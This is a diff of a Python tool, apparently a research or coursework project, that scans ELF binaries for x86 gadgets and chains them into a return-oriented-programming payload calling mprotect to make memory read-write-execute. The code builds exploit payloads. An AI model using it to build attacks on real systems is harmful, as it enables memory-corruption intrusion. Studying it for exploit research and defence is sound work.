@@ -1,9 +1,8 @@
 from capstone import *
 from copy import deepcopy
 from elftools.elf.elffile import ELFFile
-from unicorn import *
-from unicorn.x86_const import *
 
+import argparse
 import collections
 import re
 import sys
@@ -116,7 +115,6 @@ def build_from(parent_insn, code, pos, parent_instr_addr, depth):
             # recurse building gadgets from this node backwards, similar to how building gadgets from ret works
             build_from(gadget_node, code, start_index, instruction.address, depth + 1)
 
-
 def test_trie():
     ret_gadget = Gadget('ret', '', -1, -1, b'\xc3')
     root = TrieNode(ret_gadget, None, 0)
@@ -130,8 +128,7 @@ def test_trie():
     populate_trie(root, code, 0)
     print_trie(root, [], 0)
 
-
-def get_gadgets(binaries):
+def get_gadgets(binaries, offset):
     ret_gadget = Gadget('ret', '', -1, -1, b'\xc3')
     root = TrieNode(ret_gadget, None, 0)
 
@@ -145,7 +142,7 @@ def get_gadgets(binaries):
             text_section_start_addr = text_section['sh_addr']
             # for i in md.disasm(code, text_section_start_addr):
             #     print(f'0x{i.address:x}:\t{i.mnemonic}\t{i.op_str}')
-            populate_trie(root, code, text_section_start_addr)
+            populate_trie(root, code, text_section_start_addr + offset)
 
     return root
 
@@ -155,8 +152,6 @@ def get_gadgets(binaries):
 # ecx = Length of memory to change
 # edx = 0x07
 registers = {'eax': 0x7d, 'ebx': 0xbffdf000, 'ecx': 0x00021000, 'edx': 0x7}
-EIP_ADDRESS = 0x400000
-STACK_ADDRESS = 0x0
 
 # Regexes for useful instructions. Examples are given as comments
 useful_instructions = ['inc (e\S+)', # inc eax 
@@ -174,8 +169,8 @@ useful_instructions = ['inc (e\S+)', # inc eax
                        'pop (e\S+)', # pop ebx
                        'xchg (e\S+), (e\S+)'] # xchg eax, ebx
 
-def process_node(node, curr_state, base_addr):
-    gadget_addr = base_addr + node.gadget.start_addr
+def process_node(node, curr_state):
+    gadget_addr = node.gadget.start_addr
     instruction = node.gadget.mnemonic + ' ' + node.gadget.op_str
 
     temp = b'' 
@@ -183,12 +178,12 @@ def process_node(node, curr_state, base_addr):
         temp += struct.pack("<I", gadget_addr)
         
         if node.gadget.op_str in registers:
-            if node.gadget.op_str == 'ebx':
+            if node.gadget.op_str == 'ebx' and curr_state['ebx'] != registers['ebx']:
                 val = registers['ebx'] - 1 # Address must be end in 000, so subtract 1 to avoid null byte
                 temp += struct.pack("<I", val)            
                 curr_state['ebx'] = val
 
-            elif node.gadget.op_str == 'ecx':
+            elif node.gadget.op_str == 'ecx' and curr_state['ecx'] != registers['ecx']:
                 val = registers['ecx'] ^ 0xFFFFFFFF
                 temp += struct.pack("<I", val)
                 curr_state['ecx'] = val 
@@ -205,7 +200,7 @@ def process_node(node, curr_state, base_addr):
         reg1, reg2 = re.search('xor (e\S+), (e\S+)', instruction).groups()
         
         # Zero out one of eax, ebx, ecx, or edx
-        if reg1 == reg2 and reg1 in registers:
+        if reg1 == reg2 and reg1 in registers and curr_state[reg1] != 0:
             temp += struct.pack("<I", gadget_addr)
             curr_state[reg1] = 0x0
 
@@ -217,23 +212,32 @@ def process_node(node, curr_state, base_addr):
                 temp += struct.pack("<I", gadget_addr) * inc_count 
                 curr_state[node.gadget.op_str] = registers[node.gadget.op_str]
 
+    elif node.gadget.mnemonic == 'dec':
+        # Dec one of eax, ebx, ecx, or edx
+        if node.gadget.op_str in registers:
+            if curr_state[node.gadget.op_str] > registers[node.gadget.op_str]:
+                dec_count = curr_state[node.gadget.op_str] - registers[node.gadget.op_str]
+                temp += struct.pack("<I", gadget_addr) * dec_count 
+                curr_state[node.gadget.op_str] = registers[node.gadget.op_str]
+
     elif node.gadget.mnemonic == 'not':
         # Inc one of eax, ebx, ecx, or edx
-        if node.gadget.op_str == 'ecx' and curr_state['ecx'] == registers['ecx'] ^ 0xFFFFFFFF:
+        if node.gadget.op_str == 'ecx' and curr_state['ecx'] == (0x00021000 ^ 0xFFFFFFFF):
             temp += struct.pack("<I", gadget_addr)
-            curr_state[node.gadget.op_str] = registers[node.gadget.op_str] ^ 0xFFFFFFFF
+            curr_state[node.gadget.op_str] = registers[node.gadget.op_str]
 
     elif node.gadget.mnemonic == 'mov' and re.search('mov (e\S+), (0[xX][\dA-Fa-f]+)', instruction):
         reg, imm = re.search('mov (e\S+), (0[xX][\dA-Fa-f]+)', instruction).groups()
+        imm = int(imm, 16)
 
-        if reg in registers and imm < curr_state[reg]:
+        if reg in registers and imm == registers[reg] and curr_state[reg] != registers[reg]:
             temp += struct.pack("<I", gadget_addr)
             curr_state[reg] = imm      
 
     return temp       
 
 # Do a BFS on root to find useful gadgets
-def create_payload(root, base_addr):
+def create_payload(root):
     queue = collections.deque()
     queue.append(root)
 
@@ -247,19 +251,17 @@ def create_payload(root, base_addr):
             return payload
 
         node = queue.popleft()
-        bad = False
 
-        instr_payload = process_node(node, curr_state, base_addr)
+        instr_payload = process_node(node, curr_state)
         curr_node = node
         while curr_node.parent != None:
             if temp != b'' and instr_payload == b'': 
-                if instr_payload == b'':
-                    temp = b''
-                    curr_state = deepcopy(registers_state)
-                    break
+                temp = b''
+                curr_state = deepcopy(registers_state)
+                break
             else:
                 temp += instr_payload
-                instr_payload = process_node(node, curr_state, base_addr)
+                instr_payload = process_node(node, curr_state)
                 curr_node = curr_node.parent
 
         if curr_node.parent == None:
@@ -273,12 +275,21 @@ def create_payload(root, base_addr):
             for child in node.children[mnemonic]:
                 queue.append(child)
         
+    print('\nGenerated Payload:')
     return payload
 
+def main():
+    parser = argparse.ArgumentParser(description='Creates a ROP payload to execute mprotect()')
+    parser.add_argument('--binary', nargs='+', type=str, required=True, help='Binary files to look for gadgets' )
+    parser.add_argument('--offset', nargs='*', type=str, help='Offset for gadget addresses')
+    args = parser.parse_args()
+    
+    binaries = args.binary
+    offset = 0
+    if args.offset is not None:
+        offset = int(args.offset.pop(), 16)
 
-if (len(sys.argv) > 1):
-    print(create_payload(get_gadgets(sys.argv[1:]), 0x1111111))
-    #root = get_gadgets(sys.argv[1:])
-    #print_trie(root, [], 0)
-else:
-    test_trie()
+    print(create_payload(get_gadgets(binaries, offset)))
+
+if __name__ == '__main__':
+    main()   
